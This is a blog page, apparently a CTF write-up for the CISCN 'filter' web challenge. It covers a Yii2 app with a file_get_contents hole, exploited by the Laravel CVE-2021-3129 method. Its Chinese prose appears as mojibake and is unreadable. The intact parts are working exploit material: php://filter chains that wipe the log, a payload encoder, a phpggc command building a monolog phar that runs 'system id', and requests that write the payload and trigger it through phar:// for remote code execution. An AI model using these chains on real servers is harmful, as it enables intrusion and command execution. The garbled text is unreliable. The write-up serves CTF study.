<!DOCTYPE html>
<html lang="en"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style>
        :root {
            --accent-color: #08F;
        }
    </style>

    
    
    
    
    
    

    
    <title>CISCN_web_filter</title>
    <meta name="description" content="web security | code review">
    <meta name="keywords" content='blog, gokarna, hugo, yii2, RCE'>

    <meta property="og:url" content="https://nullarray.top/posts/ciscn-web-filter/">
    <meta property="og:type" content="website">
    <meta property="og:title" content="CISCN_web_filter">
    <meta property="og:description" content="web security | code review">
    <meta property="og:image" content="https://i.loli.net/2021/05/27/lVHJnBUsLogA5PN.png">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="CISCN_web_filter">
    <meta name="twitter:description" content="web security | code review">
    <meta property="twitter:domain" content="https://nullarray.top/posts/ciscn-web-filter/">
    <meta property="twitter:url" content="https://nullarray.top/posts/ciscn-web-filter/">
    <meta name="twitter:image" content="https://i.loli.net/2021/05/27/lVHJnBUsLogA5PN.png">

    
    <link rel="canonical" href="https://nullarray.top/posts/ciscn-web-filter/" />

    <link rel="stylesheet" type="text/css" href="https://nullarray.top/css/normalize.min.css" media="print" onload="this.media='all'">
    <link rel="stylesheet" type="text/css" href="https://nullarray.top/css/main.css">
    <link disabled id="dark-theme" rel="stylesheet" href="https://nullarray.top/css/dark.css">

    <script src="https://nullarray.top/js/svg-injector.min.js"></script>
    <script src="https://nullarray.top/js/feather-icons.min.js"></script>
    <script src="https://nullarray.top/js/main.js"></script>

    
    
        <!-- KaTeX -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.16/dist/katex.min.css" integrity="sha384-6LkG2wmY8FK9E0vU9OOr8UvLwsaqUg9SETfpq4uTCN1agNe8HRdE9ABlk+fVx6gZ" crossorigin="anonymous">
    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.16/dist/katex.min.js" integrity="sha384-31El76TwmbHj4rF9DyLsygbq6xoIobG0W+jqXim+a3dU9W53tdH3A/ngRPxOzzaB" crossorigin="anonymous"></script>
    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.16/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
        onload="renderMathInElement(document.body);"></script>
  
    
</head>
<body>
        <script type="text/javascript">
            
            setThemeByUserPref();
        </script><header class="header">
    <nav class="header-nav">

        
        <div class="avatar">
            <a href="https://nullarray.top">
                <img src="https://i.loli.net/2021/05/27/iSZvInqMko5AT7C.jpg" alt="avatar" />
            </a>
        </div>
        

        <div class="nav-title">
            <a class="nav-brand" href="https://nullarray.top">le3teq&#39;s Blog</a>
        </div>

        <div class="nav-links">
            
            <div class="nav-link">
                <a href="https://nullarray.top/"> Home </a>
            </div>
            
            <div class="nav-link">
                <a href="https://nullarray.top/posts/"> Posts </a>
            </div>
            
            <div class="nav-link">
                <a href="https://nullarray.top/projects/"> Projects </a>
            </div>
            
            <div class="nav-link">
                <a href="https://nullarray.top/tags/"> Tags </a>
            </div>
            
            <div class="nav-link">
                <a href="https://nullarray.top/lives/"> Lives </a>
            </div>
            
            <div class="nav-link">
                <a href="https://github.com/526avijitgupta/gokarna"><span data-feather='github'></span>  </a>
            </div>
            
            <div class="nav-link">
                <a href="https://nullarray.top"><span data-feather='coffee'></span>  </a>
            </div>
            
            <div class="nav-link">
                <a href="https://nullarray.top/index.xml"><span data-feather='rss'></span>  </a>
            </div>
            

            <span class="nav-icons-divider"></span>
            <div class="nav-link dark-theme-toggle">
                <a>
                    <span id="theme-toggle-icon" data-feather="moon"></span>
                </a>
            </div>

            <div class="nav-link" id="hamburger-menu-toggle">
                <a>
                    <span data-feather="menu"></span>
                </a>
            </div>

            
            <ul class="nav-hamburger-list visibility-hidden">
                
                <li class="nav-item">
                    <a href="https://nullarray.top/"> Home </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://nullarray.top/posts/"> Posts </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://nullarray.top/projects/"> Projects </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://nullarray.top/tags/"> Tags </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://nullarray.top/lives/"> Lives </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://github.com/526avijitgupta/gokarna"><span data-feather='github'></span>  </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://nullarray.top"><span data-feather='coffee'></span>  </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://nullarray.top/index.xml"><span data-feather='rss'></span>  </a>
                </li>
                
                <li class="nav-item dark-theme-toggle">
                    <a>
                        <span id="theme-toggle-icon" data-feather="moon"></span>
                    </a>
                </li>
            </ul>

        </div>
    </nav>
</header>
<main id="content">
    <div class="post container">
    <div class="post-header-section">
        <h1>CISCN_web_filter</h1>
        <small role="doc-subtitle"></small>
        <p class="post-date">
            May 25, 2021
        </p>

        <ul class="post-tags">
        
            <li class="post-tag"><a href="https://nullarray.top/tags/yii2">yii2</a></li>
        
            <li class="post-tag"><a href="https://nullarray.top/tags/rce">RCE</a></li>
        
        </ul>
    </div>

    <div class="post-content">
        <p>
            <p>å›½èµ›çš„ä¸€é“php://filterçš„è¿‡æ»¤å™¨åˆ©ç”¨ï¼Œé¡ºä¾¿å­¦ä¹ ä¸€ä¸‹laravel8çš„debug RCE</p>
<h3 id="æœ¬åœ°ç¯å¢ƒæ­å»º">æœ¬åœ°ç¯å¢ƒæ­å»º</h3>
<p>macä¸‹composerç›´æ¥å®‰è£…yii2</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">composer create-project --prefer-dist yiisoft/yii2-app-basic basic
</code></pre></div><p>é¢˜ç›®ç»™äº†<code>composer.json</code>å’Œsiteæ§åˆ¶å™¨å†…å®¹ï¼ˆåº”è¯¥ï¼Œæ¯”è¾ƒä¸€ä¸‹ç”Ÿæˆçš„yii2çš„<code>composer.json</code>æ–‡ä»¶ï¼Œå‘ç°ç¼ºå°‘monologæ¨¡å—</p>
<p><img src="https://i.loli.net/2021/05/28/9XdjVUPaI1yTAzJ.png" alt=""></p>
<p>æ·»åŠ è¿›é¡¹ç›®ä¸­çš„<code>composer.json</code>ï¼Œæ‰§è¡Œ<code>composer update</code>å³å¯å®‰è£…ç¼ºå°‘çš„æ—¥å¿—æ¨¡å—ã€‚æ¥ç€åœ¨configç›®å½•çš„<code>web.php</code>æ–‡ä»¶ä¸­è®¾ç½®æ—¥å¿—çº§åˆ«ï¼ˆåªéœ€è¦errorçº§åˆ«å³å¯ï¼Œæ–¹ä¾¿åç»­åˆ©ç”¨</p>
<p><img src="https://i.loli.net/2021/05/28/pvkKnBEg3Q2rITs.png" alt=""></p>
<p>æœ€åæŠŠé¢˜ç›®ç»™çš„<code>SiteController.php</code>æ–‡ä»¶ä¸­çš„æ¼æ´ä»£ç æ·»åŠ ä¸Šå»</p>
<p><img src="imgs/duqoSB7DG1CiUwz.png" alt=""></p>
<h3 id="åˆ©ç”¨">åˆ©ç”¨</h3>
<p>æ ¹æ®æ·»åŠ çš„ä»£ç æˆ‘ä»¬èƒ½å‘ç°è¿™å°±æ˜¯<code>laravel8</code>çš„RCEçš„ç®€åŒ–ç‰ˆï¼Œæ²¡æœ‰äº†ä»£ç å®¡è®¡æµç¨‹ï¼Œç›´æ¥ç»™äº†æ¼æ´ç‚¹ã€‚æ ¹æ®æ¼æ´åˆ©ç”¨è¿‡ç¨‹ï¼Œç®€åŒ–ä¸ºå››æ­¥ã€‚</p>
<ol>
<li><strong>æ¸…ç©ºæ—¥å¿—</strong></li>
<li><strong>å†™å…¥éœ€è¦æ¶æ„payloadåˆ°æ—¥å¿—</strong></li>
<li><strong>åˆ©ç”¨php://filteræ¸…é™¤å¤šä½™å†…å®¹ï¼Œè½¬åŒ–ä¸ºpharçº¯å‡€æ–‡ä»¶</strong></li>
<li><strong>åˆ©ç”¨pharåè®®getshell</strong></li>
</ol>
<p>å…ˆè¿›è¡Œæ—¥å¿—æ¸…é™¤ï¼Œå¯¹äºyii2çš„æ—¥å¿—è·Ÿè¿›å‰é¢çš„æ—¥å¿—æ–‡ä»¶æ–¹æ³•</p>
<p><img src="https://i.loli.net/2021/05/28/JT8wGgB4fnUdSCp.png" alt=""></p>
<p>æ‰¾åˆ°æ—¥å¿—ä½ç½® <code>/runtime/logs/app.log</code></p>
<p>å…ˆè¿›è¡Œæ—¥å¿—æ¸…é™¤ï¼Œè¿™é‡Œä½¿ç”¨consumedè¿‡æ»¤å™¨ï¼Œç”¨æ¥æ¸…é™¤æ–‡ä»¶å†…å®¹ï¼Œå…·ä½“ä½œç”¨å®˜æ–¹å¹¶æœªå…¬å¼€ç»†èŠ‚ã€‚</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">php://filter/read<span style="color:#ff79c6">=</span>consumed/resource<span style="color:#ff79c6">=</span>../runtime/logs/app.log
</code></pre></div><p>æ ¹æ®<code>Laravel8</code>çš„RCEè¿˜å¯ä»¥ç”¨</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">php://filter/write<span style="color:#ff79c6">=</span>convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource<span style="color:#ff79c6">=</span>../runtime/logs/app.log
</code></pre></div><p>æ¥æ¸…é™¤æ—¥å¿—ï¼Œä¸»è¦åˆ©ç”¨æ€è·¯æ˜¯å°†æ–‡ä»¶å†…å®¹å˜ä¸ºébase64å­—ç¬¦ï¼Œç„¶åä½¿ç”¨<code>convert.base64-decode</code>è¿‡æ»¤å™¨æ¥è¿›è¡Œè§£å¯†ï¼Œè¿™æ ·å°±ä¼šè¾¾åˆ°æ¸…ç©ºç›®çš„ï¼Œå…·ä½“ç»†èŠ‚å‚è€ƒ</p>
<p><a href="https://xz.aliyun.com/t/9030#toc-4">Laravel Debug mode RCEï¼ˆCVE-2021-3129ï¼‰åˆ†æå¤ç°</a></p>
<p>æ¥ç€æ˜¯å†™å…¥æ¶æ„<strong>payload</strong>ï¼Œé€šè¿‡å‰é¢æ–‡ç« çš„åˆ†æå¤ç°æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå†™å…¥payloadåæ—¥å¿—æ ¼å¼ä¸º</p>
<pre><code>[x]payload [x]payload [x]éƒ¨åˆ†payload
</code></pre><p>ä¹Ÿå°±æ˜¯ä¸¤éƒ¨åˆ†å®Œæ•´payloadå’Œä¸€éƒ¨åˆ†æ®‹ç¼ºçš„payloadï¼Œè¿™é‡Œçœ‹çœ‹æˆ‘ä»¬<strong>yii2</strong>ä¸‹é¢çš„æ—¥å¿—æ ¼å¼ã€‚</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">2021-05-28 01:51:07 [::1][-][qevmoqnh9m29scm5b1c06l0jh5][error][yii\base\ErrorException:2] yii\base\ErrorException: file_get_contents(hshui): Failed to open stream: No such file or directory in /Users/sw0r3d/works/test/yii_test/basic/controllers/SiteController.php:65
Stack trace:
#0 [internal function]: yii\base\ErrorHandler-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;/Users/sw0r3d/w...&#39;, 65)
#1 /Users/sw0r3d/works/test/yii_test/basic/controllers/SiteController.php(65): file_get_contents(&#39;hshui&#39;)
#2 [internal function]: app\controllers\SiteController-&gt;actionIndex()
#3 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/InlineAction.php(57): call_user_func_array(Array, Array)
#4 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/Controller.php(181): yii\base\InlineAction-&gt;runWithParams(Array)
#5 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/Module.php(534): yii\base\Controller-&gt;runAction(&#39;&#39;, Array)
#6 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/web/Application.php(104): yii\base\Module-&gt;runAction(&#39;&#39;, Array)
#7 /Users/sw0r3d/works/test/yii_test/basic/vendor/yiisoft/yii2/base/Application.php(392): yii\web\Application-&gt;handleRequest(Object(yii\web\Request))
#8 /Users/sw0r3d/works/test/yii_test/basic/web/index.php(12): yii\base\Application-&gt;run()
#9 {main}
</code></pre></div><p>å¯ä»¥çœ‹åˆ°å…¶å®åªæœ‰ä¸¤éƒ¨åˆ†payloadï¼Œä¹Ÿå°±æ˜¯</p>
<pre><code>[x]payload [x]éƒ¨åˆ†payload
</code></pre><p>æ ¼å¼ä¼šå½±å“æˆ‘ä»¬å†™å…¥payloadï¼Œæˆ‘ä»¬å…ˆå°è¯•å†™æ™®é€šå­—ç¬¦ï¼Œé€šè¿‡åŸä½œè€…æå‡ºçš„<code>convert.iconv.utf-16le.utf-8</code>æ–¹æ³•ï¼Œä»¥åŠå‰é¢æ¸…ç©ºæ—¥å¿—çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥å°†å†™å…¥payloadä¸­ä½¿ç”¨è¿‡æ»¤å™¨çš„é¡ºåºè¡¨ç¤ºä¸º</p>
<p><strong>convert.quoted-printable-decode</strong> - &gt; <strong>convert.iconv.utf-16le.utf-8</strong> -&gt; <strong>convert.base64-decode</strong></p>
<p>è¿™å…¶å®å°±æ˜¯ä¸€ä¸ªæ—¥å¿—æ¸…é™¤çš„ç®€åŒ–ç‰ˆï¼Œä¸è¿‡åœ¨<strong>utf-16le.utf-8</strong>è¿‡æ»¤å™¨ä½¿ç”¨çš„æ—¶å€™æ˜¯æ¯æ¬¡å¯¹ä¸¤ä¸ªå­—ç¬¦è¿›è¡Œè¯†åˆ«ï¼Œæ‰€ä»¥åœ¨ä¸¤éƒ¨åˆ†å®Œæ•´payloadçš„æ—¶å€™ä¼šæ¸…é™¤å¤±è´¥ï¼Œå¯¹äºéƒ¨åˆ†payloadçš„æƒ…å†µæœ‰50%æœºç‡æˆåŠŸã€‚</p>
<p>é€šè¿‡ä¸Šé¢è¿™ä¸ªé“¾ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ åå‘é“¾å³å¯å†™å…¥ä»»æ„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯base64åŠ å¯†åç¬¦åˆ<code>utf-16le.utf-8</code>ä»¥åŠ<code>quoted-printable-decode</code>è§£å¯†ï¼Œbase64æˆ‘ä»¬èƒ½å®ç°ï¼Œ<code>utf-16le.utf-8</code>å‚è€ƒå®˜æ–¹æ–‡æ¡£</p>
<p><img src="https://i.loli.net/2021/05/28/MTEiLgymUt3zGpY.png" alt="image-20210528111652761"></p>
<p>ä¹Ÿå°±æ˜¯åœ¨å­—ç¬¦å’Œå­—ç¬¦ä¹‹é—´æ·»åŠ äº†<code>\0</code>ï¼Œè€Œ<code>quote-printable</code>åˆ™æ˜¯è½¬æˆ<code>=</code> +  ASCIIç </p>
<p><img src="https://i.loli.net/2021/05/28/5lEK7VuyZRdxbjO.png" alt="image-20210528112030143"></p>
<p>å‚è€ƒä¸Šé¢æ–‡ç« çš„ç”Ÿæˆç¬¦åˆé“¾å­—ç¬¦çš„è„šæœ¬</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> base64

res <span style="color:#ff79c6">=</span> base64<span style="color:#ff79c6">.</span>b64encode(<span style="color:#f1fa8c">&#39;xxxxx&#39;</span>)
<span style="color:#ff79c6">print</span>(<span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join([<span style="color:#f1fa8c">&#34;=&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">hex</span>(<span style="color:#8be9fd;font-style:italic">ord</span>(i))[<span style="color:#bd93f9">2</span>:] <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;=00&#34;</span> <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> res])<span style="color:#ff79c6">.</span>upper())
<span style="color:#6272a4">#=65=00=48=00=68=00=34=00=65=00=48=00=67=00=3D=00</span>
</code></pre></div><h4 id="tips">tips</h4>
<p>ä¸‹é¢å…³äºå†™å…¥payloadçš„ä¸¤ä¸ªé—®é¢˜ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥å†™å…¥ç”Ÿæˆçš„å­—ç¬¦</p>
<p><img src="https://i.loli.net/2021/05/28/iaKdl5eBM8n93p6.png" alt="image-20210528113356324"></p>
<p><img src="https://i.loli.net/2021/05/28/65iQzAqNUOZc3HK.png" alt="image-20210528114302006"></p>
<p><code>utf-16le.utf-8</code>æŠ¥é”™äº†ï¼Œå‰é¢è¯´è¿‡è¿™ä¸ªè¿‡æ»¤å™¨å¯¹äºå­—ç¬¦è½¬æ¢æ˜¯ä¸¤ä¸ªå­—ç¬¦è¿›è¡Œè¯†åˆ«ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨å†™å…¥payloadçš„åé¢åŠ ä¸Šä¸€ä¸ªä»»æ„å­—ç¬¦ï¼Œè®©payloadç»“æœä¸ºåŒæ•°ã€‚</p>
<p>å†™å…¥<code>payload</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http">?file==65=00=48=00=68=00=34=00=65=00=48=00=67=00=3D=00x
</code></pre></div><p>æ¸…é™¤å…¶ä»–å­—ç¬¦</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http">?file=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log
</code></pre></div><p>æˆåŠŸå†™å…¥</p>
<p><img src="https://i.loli.net/2021/05/28/jWtiyCBgD5vrTN3.png" alt=""></p>
<p>ä¸‹é¢å°±æ˜¯å†™å…¥ä»»æ„<code>payload</code>ï¼Œç”¨<code>phpggc</code>æ‰¾ä¸€ä¸ªç¬¦åˆ<code>monolog</code>ç‰ˆæœ¬çš„RCEé“¾ï¼Œç”Ÿæˆ</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">php -d<span style="color:#f1fa8c">&#39;phar.readonly=0&#39;</span> ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0|python -c <span style="color:#f1fa8c">&#34;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&#34;</span>
<span style="color:#6272a4">#å¦‚æœè¦æ‰§è¡Œå¸¦æœ‰ç©ºæ ¼çš„å‘½ä»¤ï¼Œéœ€è¦ç”¨å¼•å·åŒ…å«ä¸€ä¸‹ï¼Œç±»ä¼¼system &#39;ls /&#39;</span>
</code></pre></div><p>ç”¨ä¸Šé¢è„šæœ¬ç”Ÿæˆä¸€ä¸‹ç„¶åå†™å…¥ï¼Œæœ¬åœ°å†™å…¥payloadåè¿›è¡Œå¹²æ‰°å­—ç¬¦æ¸…é™¤çš„æ—¶å€™ï¼Œå› ä¸ºé•¿åº¦é—®é¢˜å¯èƒ½ä¼šå¯¼è‡´è½¬æ¢å‡ºé”™ï¼Œè½¬åŒ–é”™è¯¯å°±æ·»åŠ ä¸€ä¸ªå­—ç¬¦ä¿è¯ä¸ºåŒæ•°å³å¯ã€‚</p>
<p>é‡å¤ä¸Šé¢å†™å…¥ä»»æ„å­—ç¬¦æ“ä½œï¼Œæœ€åç”¨pharè¿›è¡Œæ–‡ä»¶åŒ…å«</p>
<pre><code class="language-url" data-lang="url">?file=phar://../runtime/logs/app.log/test.txt
</code></pre><p><img src="https://i.loli.net/2021/05/28/Unckv29FwsQ3YCB.png" alt="image-20210528135430505"></p>
<h3 id="åç»­-5-28">åç»­ 5-28</h3>
<p>ç”±äºå‰é¢æœ‰æåˆ° <code>convert.iconv.utf-16le.utf-8</code> è¿‡æ»¤å™¨æ˜¯é€šè¿‡æ¯ä¸¤ä¸ªå­—ç¬¦è¿›è¡Œè½¬æ¢ï¼ŒğŸ¤”äº†ä¸€ä¸‹ï¼Œå¦‚æœæŠŠæ—¥å¿—å†…å®¹ç»è¿‡base64åŠ å¯†ä¸€æ¬¡è½¬æˆåŒæ•°çš„å­—ç¬¦ï¼Œç„¶åå†ç”¨ <code>utf-16le</code> æ¥è½¬æ¢æˆébase64å­—ç¬¦ï¼Œæœ€åå†base64è§£å¯†ä¸€æ¬¡ï¼Œåº”è¯¥ä¹Ÿå¯ä»¥è¾¾åˆ°æ¸…é™¤æ—¥å¿—çš„ç›®çš„ã€‚</p>
<pre><code class="language-url" data-lang="url">?file=php://filter/write=convert.base64-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log
</code></pre><p>ç»“åˆä¹‹å‰çš„æ–¹å¼å°±æœ‰ä¸‰ç§æ¸…é™¤æ—¥å¿—çš„æ–¹æ³•ï¼Œå¯¹äºå†™æ—¥å¿—<code>strips.tags</code>åº”è¯¥ä¹Ÿå¯ä»¥è¿›è¡Œåˆ©ç”¨( Dog3çš„å¸ˆå‚…å‘Šè¯‰æˆ‘çš„ã€‚</p>
<p>æœ€åæ˜¯å¯¹äºå‘½ä»¤æ‰§è¡Œï¼Œç”±äºè§¦å‘å‡½æ•°æ˜¯<code>call_user_func</code>ï¼Œåœ¨php7ç‰ˆæœ¬åï¼Œ<code>assert</code>ä¸èƒ½ç”¨æ¥è¿›è¡Œä»£ç æ‰§è¡Œäº†ï¼Œå¯¼è‡´å†™shellçš„æƒ³æ³•è½ç©ºï¼Œæœ€åä¹Ÿæ²¡æˆåŠŸã€‚</p>

        </p>
    </div>
</div>

<aside class="post-toc">
    <nav id="toc">
        <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li>
          <ul>
            <li><a href="#æœ¬åœ°ç¯å¢ƒæ­å»º">æœ¬åœ°ç¯å¢ƒæ­å»º</a></li>
            <li><a href="#åˆ©ç”¨">åˆ©ç”¨</a>
              <ul>
                <li><a href="#tips">tips</a></li>
              </ul>
            </li>
            <li><a href="#åç»­-5-28">åç»­ 5-28</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>
    </nav>
</aside>



    

        </main><footer class="footer">
    <span>&copy; 2022 le3&#39;s blog</span>
    <span>
        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
    </span>
</footer>
</body>
</html>
